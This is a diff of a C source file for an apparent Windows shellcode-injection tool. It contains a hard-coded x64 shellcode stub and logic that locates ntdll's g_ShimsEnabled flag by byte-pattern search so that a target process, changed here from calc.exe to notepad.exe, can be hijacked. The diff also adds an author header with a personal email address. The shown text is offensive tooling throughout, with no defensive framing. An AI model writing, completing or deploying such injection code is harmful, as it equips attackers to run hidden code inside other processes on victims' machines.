@@ -1,11 +1,13 @@
 /*
-   
+    Author  => Abdallah Mohamed ( 0xNinjaCyclone )
+    Email   => elsharifabdallah53@gmail.com
+    Date    => January 7, 2025 - 07:43PM
 */
 
 
 #include <Windows.h>
 #include <stdio.h>
-#define TARGET_PROCESS "calc.exe"
+#define TARGET_PROCESS "notepad.exe"
 
 
 BYTE x64_stub[] =  "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
@@ -188,12 +190,9 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     /*
         We are looking for this pattern:
         443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
-        49391c ?? c8
-        $+79174          | 49:391CC8                | cmp qword ptr ds:[r8+rcx*8],rbx         |
-        $+79178          | 49:8D14C8                | lea rdx,qword ptr ds:[r8+rcx*8]         |
     */
 
-    while (dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, "\x49\x39\x1c", 3)) {
+    while (dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, "\x44\x38\x25", 3)) {
         /* Jump into the offset */
         dwPtr += 0x3;
         
